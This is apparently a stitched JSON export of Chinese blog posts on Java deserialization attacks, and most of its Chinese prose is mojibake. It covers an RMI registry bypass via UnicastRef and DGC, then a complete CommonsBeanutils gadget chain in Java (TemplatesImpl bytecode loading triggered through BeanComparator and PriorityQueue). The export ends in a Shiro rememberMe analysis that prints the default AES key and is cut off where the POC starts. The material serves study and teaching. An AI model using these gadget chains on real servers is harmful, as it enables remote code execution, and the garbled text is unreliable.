è¿˜æ˜¯æœ‰é™åˆ¶çš„,å†å¾€å›çœ‹çœ‹æ„Ÿè§‰è¿˜æ˜¯åªèƒ½ä»æ³¨å†Œä¸­å¿ƒé‚£è¾¹ä¸‹æ‰‹ï¼Œä¹Ÿå°±æ˜¯çœ‹çœ‹RegistryImpl.javaæ–‡ä»¶ä¸­æœ‰æ²¡æœ‰ä¸€äº›å¯ä»¥ç»•è¿‡é™åˆ¶çš„ åœ¨é™åˆ¶çš„è¾“å…¥ç±»å‹ä¸­æœ‰ä¸€ä¸ªç±»æ˜¯UnicastRefï¼Œè¿™ä¸ªç±»åœ¨å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒçš„æ—¶å€™ä¼šèµ°åˆ°ï¼Œå¯ä»¥å»å›é¡¾ä¸€ä¸‹ è¿™æ ·çš„è¯å®¢æˆ·ç«¯è¿˜æ˜¯ä¼šå—åˆ°ååºåˆ—åŒ–çš„æ”»å‡» ç°åœ¨æœ‰ä¸€ä¸ªæ€è·¯ï¼Œå°±æ˜¯è¯´è®©æœåŠ¡ç«¯å‘èµ·ä¸€ä¸ªå®¢æˆ·ç«¯è¯·æ±‚ï¼Œå®é™…ä¸Šå°±ä¼šåœ¨æœåŠ¡ç«¯ä¸Šé¢å¯¼è‡´ä¸€ä¸ªååºåˆ—åŒ–æ”»å‡» è¿™é‡Œé‡ç‚¹å°±æ˜¯ä¸Šé¢æåˆ°çš„RegistryImpl.javaæ–‡ä»¶ä¸­çš„invokeæ–¹æ³•ï¼ŒæŸ¥æ‰¾ä¸€ä¸‹å®ƒçš„ç”¨æ³• è°ƒç”¨invokeæ–¹æ³•å®é™…ä¸Šå°±æ˜¯åœ¨stubé‡Œé¢ï¼Œä¸€ä¸ªæ˜¯RegistryImpl_Stubï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯DGCImpl_Stub æƒ³è¦è°ƒç”¨invokeæ–¹æ³•ï¼Œå°±å¿…é¡»å¾—æœ‰ä¸€ä¸ªstubï¼Œæƒ³è¦åˆ›å»ºä¸€ä¸ªsubï¼Œå°±å¿…é¡»è°ƒç”¨createProxyå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬çœ‹ä¸€ä¸‹å“ªäº›åœ°æ–¹ä¼šç”¨åˆ°createProxyå‡½æ•° ç›´æ¥è¯´ç»“è®ºå°±æ˜¯æˆ‘ä»¬è¦é‡ç‚¹å…³æ³¨ä¸‹é¢è¿™ä¸ªåœ°æ–¹çš„æ–¹æ³•è°ƒç”¨ å®ƒæ˜¯åœ¨DGCClienté‡Œé¢çš„ä¸€ä¸ªå†…éƒ¨ç±»EndpointEntryçš„æ„é€ å‡½æ•°ä¸­è°ƒç”¨çš„ ç°åœ¨çš„åˆ˜æ™¨æ˜¯å·²ç»å›ºå®šçš„ï¼ŒæœåŠ¡ç«¯ä»£ç éƒ½æ˜¯å·²ç»å†™æ­»çš„äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æƒ³æ”¹å˜ä»£ç çš„æµç¨‹ï¼Œå®é™…ä¸Šå°±æ˜¯éœ€è¦ä¸€ä¸ªååºåˆ—åŒ–çš„ç‚¹è§¦å‘åˆ›å»ºstubï¼Œç„¶åå†è°ƒç”¨invoke ä¸ºä»€ä¹ˆéœ€è¦ååºåˆ—åŒ–å‘¢ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ä¸€ä¸ªå·²ç»è·‘èµ·æ¥çš„ç¨‹åºé‡Œé¢æƒ³æ”¹å˜å®ƒçš„é€»è¾‘ï¼Œéå¸¸çš„å›°éš¾ï¼Œå®ƒçš„é‚£ç§åŠ¨æ€çš„ç‰¹æ€§åªèƒ½é€šè¿‡ååºåˆ—åŒ–æ¥å®ç° æ‰€ä»¥ç°åœ¨æˆ‘ä»¬å°±è¦ä¸€è¿™é‡Œä½œä¸ºå…¥å£ï¼Œæƒ³åŠæ³•åˆ›å»ºä¸€ä¸ªç±»EndpointEntryï¼Œç„¶åç”Ÿæˆä¸€ä¸ªdgc ä¸‹ä¸€æ­¥æˆ‘ä»¬è¦è®©dgcå‘èµ·ä¸€ä¸ªå®¢æˆ·ç«¯è¯·æ±‚ï¼Œè¦ä¹ˆæ˜¯dirtyï¼Œè¦ä¹ˆæ˜¯clean æœåŠ¡ç«¯ä¸Šåˆ›å»ºç±»EndpointEntryæŸ¥æ‰¾è¯¥ç±»çš„ç”¨æ³•ï¼Œåªæœ‰ä¸€ä¸ªlookupæ–¹æ³• æŸ¥æ‰¾lookupç”¨æ³• ç»§ç»­å¾€ä¸ŠæŸ¥æ‰¾registerRefsç”¨æ³•ï¼Œæœ€ç»ˆçš„ç›®çš„æ˜¯æŸ¥æ‰¾åˆ°ä¸€ä¸ªååºåˆ—åŒ–ç‚¹ è¿™ä¸ªæ—¶å€™æœ‰ä¸¤æ¡è·¯ åº•ä¸‹é‚£ä¸ªreadæ–¹æ³•æ˜¯åœ¨elseä¸­è°ƒç”¨registerRefsæ–¹æ³• æ¡ä»¶æ˜¯å½“è¾“å…¥æµä¸æ˜¯ConnectionInputStreamçš„æ—¶å€™æ‰ä¼šè°ƒç”¨ï¼Œä½†æ˜¯åœ¨æ•´ä¸ªååºåˆ—åŒ–æµç¨‹é‡Œé¢è¾“å…¥æµéƒ½æ˜¯ConnectionInputStream æ‰€ä»¥è¿™æ¡è·¯æ–­äº†ï¼Œåªå‰©ä¸‹ä¸Šé¢ä¸€æ¡ ç»§ç»­å¾€ä¸ŠæŸ¥æ‰¾è°ƒç”¨ æŸ¥æ‰¾releaseInputStream()æ–¹æ³•çš„è°ƒç”¨ æœ€åå°±æ˜¯æ‰¾åˆ°äº†åœ¨å„ä¸ªSkelæ–‡ä»¶ä¸­éƒ½ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæ— è®ºæ˜¯DGCImpl_Skelæˆ–æ˜¯å…¶ä»–çš„ æˆ‘ä»¬Skelæ˜¯åœ¨æœåŠ¡ç«¯çš„ï¼Œæˆ‘ä»¬åœ¨æœåŠ¡ç«¯ä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªåœ°æ–¹èƒ½å¤Ÿè®©å®ƒäº§ç”ŸdgcæœåŠ¡ å°±æ¯”å¦‚æˆ‘ä»¬çœ‹ä¸€ä¸‹æ³¨å†Œä¸­å¿ƒçš„ï¼Œæ¯”æ–¹è¯´æˆ‘ä»¬è®©å®ƒè°ƒç”¨äº†ä¸€ä¸ªæ–¹æ³•list() ç„¶åå®ƒå°±ä¼šè°ƒç”¨releaseInputStream()æ–¹æ³•ï¼Œæˆ‘ä»¬è·Ÿè¿›å»ï¼Œå…¶å®å°±æ˜¯ç›¸å½“äºä¸Šé¢æŸ¥æ‰¾çš„æµç¨‹åè¿‡æ¥ æŸ¥åˆ°ä¸‹é¢è¿™é‡Œï¼Œè¦å½“incomingRefTableä¸ä¸ºç©ºçš„æ—¶å€™æ‰ä¼šç»§ç»­å¾€ä¸‹èµ° åªè¦è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•ï¼Œæœ€åå°±ä¼šåˆ›å»ºä¸€ä¸ªdgc è¿™æ¡é“¾ä¸­éœ€è¦æˆ‘ä»¬å¤„ç†çš„åªæœ‰ä¸€ä¸ªifåˆ¤æ–­ï¼Œä½†æ˜¯æˆ‘ä»¬æ­£å¸¸ä½¿ç”¨çš„è¯incomingRefTableå°±æ˜¯ç©ºçš„ æ‰€ä»¥æˆ‘ä»¬ç°åœ¨å°±è¦æ‰¾ä¸è®©å®ƒä¸ºç©ºçš„åŠæ³•ï¼Œä¹Ÿå°±æ˜¯æ‰¾ç»™å®ƒèµ‹å€¼çš„åœ°æ–¹ï¼ŒæŸ¥æ‰¾incomingRefTableçš„ç”¨æ³• ä¹Ÿå°±åªæœ‰è¿™ä¸€ä¸ªèµ‹å€¼çš„åœ°æ–¹ï¼Œè°ƒç”¨äº†ä¸€ä¸ªputæ–¹æ³• é¦–å…ˆçš„è¯æˆ‘ä»¬éœ€è¦è°ƒç”¨saveRefæ–¹æ³•ï¼ŒæŸ¥æ‰¾ä¸€ä¸‹ ä¸Šé¢è®²è¿‡åœ¨ååºåˆ—åŒ–æµç¨‹ä¸­åªèƒ½è¿›å…¥ifå†…ï¼Œæ‰€ä»¥å®ƒå°±ä¼šç›´æ¥è°ƒç”¨åˆ°saveRefæ–¹æ³• ç°åœ¨æˆ‘ä»¬å†æŸ¥æ‰¾ä¸€ä¸‹readæ–¹æ³•ä¼šåœ¨å“ªé‡Œè°ƒç”¨ readExternalfæ–¹æ³•å®é™…ä¸Šæ˜¯javaåŸç”Ÿååºåˆ—åŒ–çš„å¦ä¸€ç§ï¼Œå°±æ˜¯ä¸readObjectç±»ä¼¼ä½†ä¸å®Œå…¨ä¸€è‡´ï¼Œæ‰€ä»¥åœ¨ååºåˆ—åŒ–çš„æ—¶å€™æœ‰è¿™ä¸ªæ–¹æ³•ä¹Ÿä¼šè°ƒç”¨ é‚£åˆ°ç°åœ¨æˆ‘ä»¬å°±å·²ç»å®Œæˆäº†æˆ‘ä»¬åˆ›å»ºdgcçš„é€»è¾‘ æˆ‘ä»¬æ€ä¹ˆåšå‘¢ é¦–å…ˆæˆ‘ä»¬å…ˆåºåˆ—åŒ–ä¸€ä¸ªUnicastRefå¯¹è±¡ï¼ˆå› ä¸ºreadExternalæ–¹æ³•åœ¨UnicastRef.javaæ–‡ä»¶ä¸­ï¼‰ï¼Œåœ¨é‡Œé¢ä¿å­˜ä¸€ä¸ªref å‰é¢æœ‰è¯´UnicastRefæ˜¯RegistryImpl.javaæ–‡ä»¶ä¸­çš„ç™½åå•å¯¹è±¡ï¼Œæ‰€ä»¥ä¼ è¿‡å»æ˜¯å¯ä»¥æ­£å¸¸ååºåˆ—åŒ–çš„ åœ¨UnicastRefé‡Œé¢å®ƒçš„ååºåˆ—åŒ–æ˜¯ä¼šè°ƒç”¨ä¸Šé¢çš„readExternalfæ–¹æ³•ï¼Œè€Œè¿™ä¸ªæ–¹æ³•åˆä¼šè°ƒç”¨readæ–¹æ³•ï¼Œreadæ–¹æ³•ä¼šè°ƒç”¨saveRefæ–¹æ³•ï¼Œè€ŒsaveRefæ–¹æ³•ä¼šç»™incomingRefTableèµ‹å€¼ï¼Œä½¿å…¶ä¸ä¸ºç©º è¿™ä¸€éƒ¨åˆ†å°±ç»“æŸäº† æ€»ç»“ï¼šä¼ å…¥UnicastRefåï¼Œå®ƒçš„ååºåˆ—åŒ–æµç¨‹èµ°å®Œåå†…å­˜ä¸­é‚£ä¸ªè¡¨ä¸ä¸ºç©ºï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±æ­£å¸¸èµ°ååºåˆ—åŒ–æµç¨‹ ä¹Ÿå°±æ˜¯åˆ°RegistryImpl_Skelä¸­ï¼Œåˆ°å®ƒçš„releaseInputSream()çš„æ—¶å€™ ç„¶åæˆ‘ä»¬å°±ç»§ç»­å¾€ä¸‹èµ°åˆ° åˆ°è¿™é‡Œåè¿™ä¸ªè¡¨å°±ä¸ä¸ºç©ºäº† æ‰€ä»¥è¯´UnicastRefçš„ååºåˆ—åŒ–åªæ˜¯ä¸ºäº†ç»™è¡¨èµ‹å€¼è®©å®ƒèµ°è¿›ifé‡Œé¢ï¼ŒçœŸæ­£çš„è§¦å‘æ”»å‡»æ˜¯åœ¨æ­£å¸¸çš„è°ƒç”¨æµç¨‹é‡Œé¢ dgcå‘èµ·ä¸€ä¸ªå®¢æˆ·ç«¯è¯·æ±‚æ‰€ä»¥ç°åœ¨å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªdgcå¯¹è±¡ï¼Œä½†æ˜¯ç›®å‰è¿˜æ²¡æœ‰åŠæ³•å‘èµ·ä¸€ä¸ªè¯·æ±‚ æ— ç¢ï¼Œæ„é€ æ–¹æ³•ç»§ç»­å¾€ä¸‹çœ‹ä¼šå‘ç°æœ‰æèµ·ä¸€ä¸ªæ–°çš„çº¿ç¨‹ èµ°è¿›å»ï¼Œè¿™ä¸ªæ–¹æ³•æœ€åè°ƒç”¨äº†makeDIrtyCallæ–¹æ³• è¯¥æ–¹æ³•é‡Œé¢å°±è‡ªå·±è°ƒç”¨äº†dgcçš„dirtyæ–¹æ³•ï¼Œä¹Ÿå°±æˆåŠŸå‘é€äº†ä¸€ä¸ªå®¢æˆ·ç«¯è¯·æ±‚ ä¹Ÿå°±æ˜¯è¯´ä»æ„é€ dgcåˆ°è°ƒç”¨dirtyæ–¹æ³•éƒ½æ˜¯jdké‡Œé¢å†™å¥½äº†çš„ï¼Œä½†é»˜è®¤é€šè¿‡åˆ¤æ–­éƒ½æ˜¯èµ°ä¸è¿›å»çš„","categories":["javaååºåˆ—åŒ–"]},{"title":"javaååºåˆ—åŒ–ä¹‹CommonsBeanutils","path":"/2024/11/23/javaååºåˆ—åŒ–ä¹‹CommonsBeanutils/","content":"å¼•ç”¨Javaååºåˆ—åŒ–ä¹‹CommonsBeanutils ä¾èµ–å¯¼å…¥é¦–å…ˆæˆ‘ä»¬å…ˆå¯¼å…¥ä¾èµ– dependency groupIdcommons-beanutils/groupId artifactIdcommons-beanutils/artifactId version1.9.3/version/dependency BeanJava Beanæ˜¯ä¸€ç§ç‰¹å®šè§„èŒƒçš„ç±»ï¼Œä½¿å¾—å¼€å‘ä¸­æ›´åŠ æ¨¡å—åŒ–ï¼Œä¸€ä¸ªbeanéœ€è¦åŒ…æ‹¬å‡ ç§ç‰¹ç‚¹ï¼š å®ç°Serializableæ¥å£ï¼Œä½¿å¾—ç±»å¯åºåˆ—åŒ– æ— å‚æ„é€ å‡½æ•°ï¼ŒJavaBeanåº”æœ‰ä¸€ä¸ªå…¬å…±çš„æ— å‚æ„é€ å‡½æ•°ä»¥ä¾¿ä½¿ç”¨çš„æ—¶å€™å¿«é€Ÿå®ä¾‹åŒ– ç§æœ‰å±æ€§ï¼Œbeançš„å±æ€§ä¸€èˆ¬è¢«å£°æ˜ä¸ºprivate å…¬æœ‰getterå’Œsetterç”¨äºä¿®æ”¹å’Œè¯»å–ç§æœ‰å±æ€§ æ³¨æ„ï¼šgetterå’Œsetteræ–¹æ³•å‘½åè¦è§„èŒƒ ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼š publc class User() implements Serializable\tprivate String name; private int age; public User() public void setName(String name)this.name = name; public void setAge(int age)this.age = age; public String getName()return this.name; public int getAge()return this.age; PropertyUtils.getProperty()public static Object getProperty(final Object bean, final String name) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException return (PropertyUtilsBean.getInstance().getProperty(bean, name)); è¯¥æ–¹æ³•ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯å®ä¾‹åŒ–åçš„beanå¯¹è±¡ï¼Œå¦ä¸€ä¸ªæ˜¯å­—ç¬¦ä¸²ç±»å‹çš„å±æ€§å æˆ‘ä»¬ç»§ç»­è·Ÿè¿›åˆ°PropertyUtilsBeanä¸­çš„getPropertyæ–¹æ³•ï¼Œè¯¥æ–¹æ³•é¦–å…ˆæ£€æµ‹beanå¯¹è±¡ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå±æ€§ï¼ˆpropertyï¼‰ï¼Œå­˜åœ¨çš„è¯è°ƒç”¨å…¶getter()ï¼Œå› æ­¤å‡å¦‚è¯´æŸä¸ªgetterä¸­å­˜åœ¨å¯åˆ©ç”¨ç‚¹ï¼Œè°ƒç”¨è¯¥æ–¹æ³•çš„æ—¶å€™å³æœ‰åˆ©ç”¨çš„å¯èƒ½ ä¸‹é¢æ¼”ç¤ºä¸€ä¸‹ è·å–ç®€å•å±æ€§import org.apache.commons.beanutils.BeanUtils;public class SimplePropertyExample public static void main(String[] args) User user = new User(); user.setUsername(johndoe); try String username = BeanUtils.getProperty(user, username); System.out.println(Username: + username); // è¾“å‡º Username: johndoe catch (Exception e) e.printStackTrace(); Userç±»å®šä¹‰å¦‚ä¸‹ package org.example;public class User private String username; public String getUsername() return username; public void setUsername(String username) this.username = username; è·å–åµŒå¥—å±æ€§import org.apache.commons.beanutils.BeanUtils;public class NestedPropertyExample public static void main(String[] args) Address address = new Address(); address.setCity(New York); User user = new User(); user.setAddress(address); try String city = BeanUtils.getProperty(user, address.city); System.out.println(City: + city); // è¾“å‡º City: New York catch (Exception e) e.printStackTrace(); Userç±»å®šä¹‰å¦‚ä¸‹ package org.example;public class User private Address address; public Address getAddress() return address; public void setAddress(Address address) this.address = address; Addressç±»å®šä¹‰å¦‚ä¸‹ package org.example;public class Address private String city; public String getCity() return city; public void setCity(String city) this.city = city; å¤„ç†é›†åˆå±æ€§package org.example;import org.apache.commons.beanutils.BeanUtils;import java.util.ArrayList;import java.util.List;import org.apache.commons.beanutils.PropertyUtils;public class Cb public static void main(String[] args) throws Exception Group group = new Group(); ListString members = new ArrayList(); members.add(Alice); members.add(Bob); group.setMembers(members); try // ä½¿ç”¨ PropertyUtils.getProperty è·å–çœŸå®çš„å±æ€§å€¼ ListString groupMembers = (ListString) PropertyUtils.getProperty(group, members); System.out.println(Group Members: + groupMembers); // è¾“å‡º Group Members: [Alice, Bob] catch (Exception e) e.printStackTrace(); Groupç±»ä»£ç å¦‚ä¸‹ï¼š package org.example;import java.util.List;public class Group private ListString members; public ListString getMembers() return members; public void setMembers(ListString members) this.members = members; TemplatesImpl.getOutputProperties()ä¸Šé¢ä»‹ç»è¿‡getProperty()æ–¹æ³•èƒ½å¤Ÿè°ƒç”¨ä¸€ä¸ªgetterï¼Œåœ¨TemplatesImplä¸­ï¼Œæœ‰ä¸€ä¸ªgetterå°±æ˜¯getOutputProperties()ï¼Œé€šè¿‡getProperty()å¦‚æœbeanæ˜¯ä¸€ä¸ªTemplatesImplå¯¹è±¡ï¼Œnameçš„å€¼ä¸ºâ€outputPropertiesâ€ï¼Œå³å¯è°ƒç”¨TemplatesImplå¯¹è±¡çš„getOutputProperties()æ–¹æ³•ã€‚CCé“¾çš„åˆ†æä¸­ï¼ŒnewTransformer()æ–¹æ³•èƒ½å¤Ÿè°ƒç”¨TransformersImplçš„æ„é€ æ–¹æ³•ï¼Œåœ¨TransformersImplçš„æ„é€ æ–¹æ³•ä¸­è°ƒç”¨äº†getTransletInstance()æ–¹æ³•ï¼Œè¿›è€Œèµ°åˆ°defineClass()-newInstance()çš„æ”»å‡»é“¾ public synchronized Properties getOutputProperties() try return newTransformer().getOutputProperties(); catch (TransformerConfigurationException e) return null; BeanComparator.compare()åœ¨BeanComparatorçš„compare()æ–¹æ³•ä¸­ï¼Œå­˜åœ¨å¯¹getProperty()æ–¹æ³•çš„è°ƒç”¨ï¼Œå¹¶ä¸”å‚æ•°å¯æ§ public int compare( final T o1, final T o2 ) if ( property == null ) // compare the actual objects return internalCompare( o1, o2 ); try final Object value1 = PropertyUtils.getProperty( o1, property ); final Object value2 = PropertyUtils.getProperty( o2, property ); return internalCompare( value1, value2 ); ...... åœ¨å‰é¢çš„CCé“¾çš„åˆ†æä¸­ï¼Œèƒ½å‘ç°æœ‰ä¸€å¤„èµ°åˆ°compare()æ–¹æ³•çš„è°ƒç”¨ï¼Œå³åˆ©ç”¨ä¼˜å…ˆé˜Ÿåˆ—çš„ï¼Œå› æ­¤CBçš„åˆ©ç”¨å·²ç»åˆå…·é›å½¢äº† gadgeté“¾æ„é€ æˆ‘ä»¬å…ˆå°è¯•æ­£å‘æ„é€ é“¾ package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.BeanComparator;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class Cb public static void main(String[] args) throws Exception TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(_name); nameField.setAccessible(true); nameField.set(templates, aaa); Field bytecodesField = tc.getDeclaredField(_bytecodes); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); byte[][] codes = code; bytecodesField.set(templates, codes); Field tfactoryField = tc.getDeclaredField(_tfactory); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); BeanComparatorObject beanComparator = new BeanComparator(); beanComparator.setProperty(outputProperties); beanComparator.compare(templates,null); è¿è¡Œåä¼šæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ ä¸Šè¿°ä»£ç æ€ä¹ˆè¿è¡Œçš„å»ºè®®è‡ªå·±è°ƒè¯•è·Ÿç€èµ°ä¸€éç†è§£ä¼šæ›´æ·±åˆ» ç„¶åæˆ‘ä»¬è¡¥ä¸Šä¼˜å…ˆé˜Ÿåˆ—æ„æˆå®Œæ•´çš„åˆ©ç”¨é“¾ package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.BeanComparator;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class Cb public static void main(String[] args) throws Exception TemplatesImpl templates = new TemplatesImpl(); Class tc = templates.getClass(); Field nameField = tc.getDeclaredField(_name); nameField.setAccessible(true); nameField.set(templates, aaa); Field bytecodesField = tc.getDeclaredField(_bytecodes); bytecodesField.setAccessible(true); byte[] code = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); byte[][] codes = code; bytecodesField.set(templates, codes); Field tfactoryField = tc.getDeclaredField(_tfactory); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); BeanComparatorObject beanComparator = new BeanComparator(); beanComparator.setProperty(outputProperties);// beanComparator.compare(templates,null); PriorityQueue priorityQueue = new PriorityQueue(beanComparator); Class c1 = priorityQueue.getClass(); Field queueField = c1.getDeclaredField(queue); queueField.setAccessible(true); queueField.set(priorityQueue,new Object[]templates,templates,templates); Field sizeField = c1.getDeclaredField(size); sizeField.setAccessible(true); sizeField.set(priorityQueue,3);// serialize(priorityQueue); unserialize(ser.bin); public static void serialize(Object obj) throws IOException ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(ser.bin)); oos.writeObject(obj); public static Object unserialize(String Filename) throws IOException, ClassNotFoundException ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj;","categories":["javaååºåˆ—åŒ–"]},{"title":"javaååºåˆ—åŒ–ä¹‹shiroååºåˆ—åŒ–","path":"/2024/11/21/javaååºåˆ—åŒ–ä¹‹shiroååºåˆ—åŒ–/","content":"æ„Ÿè°¢Pç¥æä¾›çš„ç¯å¢ƒï¼šshirodemo ç¯å¢ƒéƒ¨ç½²å…·ä½“è¿‡ç¨‹è¿™è¾¹çœ‹ è´¦å·å¯†ç ï¼šroot/secret åºåˆ—åŒ–Apache Shiroæ¡†æ¶æä¾›äº†è®°ä½å¯†ç çš„åŠŸèƒ½ï¼ˆRememberMeï¼‰ï¼Œç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookieï¼›æ•°æ®é€šè¿‡Cookieä¸­rememberMeçš„å€¼ä¼ å…¥åç«¯ä¹‹åï¼Œç»è¿‡è§£å¯†ï¼Œååºåˆ—åŒ–è·å¾—åˆ°å­˜å‚¨çš„æ•°æ® å…¨å±€æœç´¢cookieï¼Œé€‰ä¸­CookieRemberMeManagerç±»æ–‡ä»¶ æˆ‘ä»¬å¯¹è¯¥æ–‡ä»¶è¿›è¡Œå®¡è®¡ï¼Œæ‰¾åˆ°äº†ä»¥ä¸‹çš„å…³é”®å‡½æ•°rememberSerializedIdentity(Subject subject, byte[] serialized) å¯ä»¥çœ‹åˆ°å‡½æ•°ä¸­å¯¹å‚æ•°serializedè¿›è¡Œäº†base64ç¼–ç å¹¶å‚¨å­˜åˆ°äº†cookieå½“ä¸­ï¼Œå‚æ•°serializedè‚¯å®šæ˜¯è·Ÿåºåˆ—åŒ–åçš„å†…å®¹æœ‰å…³ç³»ï¼Œæˆ‘ä»¬ç°åœ¨æ‰¾ä¸€ä¸‹å“ªä¸ªæ–¹æ³•è°ƒç”¨äº†è¯¥å‡½æ•°ï¼Œåœ¨æ–‡ä»¶AbstractRememberMeManager.javaä¸­ å¯ä»¥çœ‹åˆ°rememberIdentityæ–¹æ³•ä¼ å…¥äº†ä¸€ä¸ªsubjectå¯¹è±¡ä»¥åŠä¸€ä¸ªPrincipalCollectionå¯¹è±¡ï¼Œå…ˆå¯¹principalså¯¹è±¡è¿›è¡Œä¸€ä¸ªåºåˆ—åŒ–ï¼Œç„¶åå†ç»è¿‡åŠ å¯†åè¿”å›å­—èŠ‚æµ çœ‹è¯¥æ–¹æ³•ä¸­ä¼ å…¥rememberSerializedIdentityæ–¹æ³•çš„å‚æ•°serializedå…¶å®å°±æ˜¯byteså‚æ•°ï¼Œç»è¿‡äº†ä¸€ä¸ªæ–¹æ³•çš„å¤„ç†ï¼Œæˆ‘ä»¬è·Ÿè¿›è¯¥convertPrincipalsToBytesæ–¹æ³• protected byte[] convertPrincipalsToBytes(PrincipalCollection principals) byte[] bytes = serialize(principals); if (getCipherService() != null) bytes = encrypt(bytes); return bytes; å¯¹å‚æ•°principalså…ˆè¿›è¡Œåºåˆ—åŒ–ï¼Œå†åˆ¤å®šgetCipherService()æ˜¯å¦ä¸ºç©ºï¼Œè·Ÿè¿› public CipherService getCipherService() return cipherService; ç»§ç»­è·Ÿè¿›ï¼Œå¯ä»¥å‘ç°å…¶æ˜¯å®šä¹‰åœ¨æ„é€ å‡½æ•°ä¸­çš„ public AbstractRememberMeManager() this.serializer = new DefaultSerializerPrincipalCollection(); this.cipherService = new AesCipherService(); setCipherKey(DEFAULT_CIPHER_KEY_BYTES); ç»§ç»­æŒç»­è·Ÿè¿›ï¼Œæœ€åä¼šå‘ç°cipherServiceèµ‹å€¼ä¸ºAESï¼Œä¸ä¸ºç©ºï¼Œè¿›å…¥ifä»å¥ï¼Œè·Ÿè¿›encryptæ–¹æ³• protected byte[] encrypt(byte[] serialized) byte[] value = serialized; CipherService cipherService = getCipherService(); if (cipherService != null) ByteSource byteSource = cipherService.encrypt(serialized, getEncryptionCipherKey()); value = byteSource.getBytes(); return value; é»˜è®¤çš„keyä¹Ÿåœ¨æ„é€ å‡½æ•°æ­¤å¤„è®¾å®šäº†setCipherKey(DEFAULT_CIPHER_KEY_BYTES)ï¼Œè·Ÿè¿›åå¯ä»¥çœ‹åˆ°é»˜è®¤çš„keyå·²ç»æ˜æ–‡æ˜¾ç¤ºåœ¨é‚£è¾¹äº† private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(kPH+bIxk5D2deZiIxcaaaA==); ååºåˆ—åŒ–æ—¢ç„¶æœ‰åºåˆ—åŒ–æµç¨‹ï¼Œé‚£è‚¯å®šä¹Ÿä¼šæœ‰ååºåˆ—åŒ–æµç¨‹ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æœç´¢deserialize()æ–¹æ³•ï¼Œç›´æ¥å®šä½åˆ°convertBytesToPrincipalsæ–¹æ³• protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) if (getCipherService() != null) bytes = decrypt(bytes); return deserialize(bytes); ifä»å¥ä¸­è§£å¯†æ–¹æ³•æ²¡ä»€ä¹ˆç‰¹åˆ«ä¹‹å¤„ï¼Œæˆ‘ä»¬é‡ç‚¹çœ‹ä¸€ä¸‹deserializeå‡½æ•°ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤ï¼Œè·Ÿè¿›è¿›å» protected PrincipalCollection deserialize(byte[] serializedIdentity) return getSerializer().deserialize(serializedIdentity); getSerializer()æ–¹æ³•å°±æ˜¯è·å–ç±»DefaultSerializerï¼Œè·Ÿè¿›è¯¥ç±»ä¸­æŸ¥æ‰¾deserializeæ–¹æ³• public T deserialize(byte[] serialized) throws SerializationException if (serialized == null) String msg = argument cannot be null.; throw new IllegalArgumentException(msg); ByteArrayInputStream bais = new ByteArrayInputStream(serialized); BufferedInputStream bis = new BufferedInputStream(bais); try ObjectInputStream ois = new ClassResolvingObjectInputStream(bis); @SuppressWarnings(unchecked) T deserialized = (T) ois.readObject(); ois.close(); return deserialized; catch (Exception e) String msg = Unable to deserialze argument byte array.; throw new SerializationException(msg, e); å¯ä»¥å‘ç°å°±æ˜¯å•çº¯çš„ååºåˆ—åŒ–ï¼Œæ²¡æœ‰è¿›è¡Œä»»ä½•çš„è¿‡æ»¤ï¼Œé»‘åå•é™åˆ¶ç­‰ï¼Œè¯»å–åç›´æ¥èµ°å…¥readObjectä¸­ POCæ ¹æ®ä¸Šé¢åºåˆ—åŒ–çš„æµç¨‹æˆ‘ä»¬å¯ä»¥å¾—å‡ºcookieçš„åºåˆ—åŒ–æµç¨‹ä¸ºï¼š å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–\tä½¿ç”¨base64è§£ç åçš„å¯†é’¥å¯¹åºåˆ—åŒ–åçš„å­—èŠ‚æµè¿›è¡ŒåŠ å¯† ä½¿ç”¨base64ç¼–ç aesåŠ å¯†åçš„æµï¼Œæœ€ç»ˆè¿”å›base64ç¼–ç åçš„cookie ååºåˆ—åŒ–æ¼æ´çš„pocè‡ªç„¶å°±æ˜¯URLDNSé“¾äº†ï¼Œå¯¹hashmapåºåˆ—åŒ–ä¹‹åï¼ŒæŒ‰ç…§shiroçš„åŠ å¯†æµç¨‹ä»¥åŠé»˜è®¤å¯†é’¥æ„é€ poc package sherlock;import org.apache.shiro.codec.Base64;import 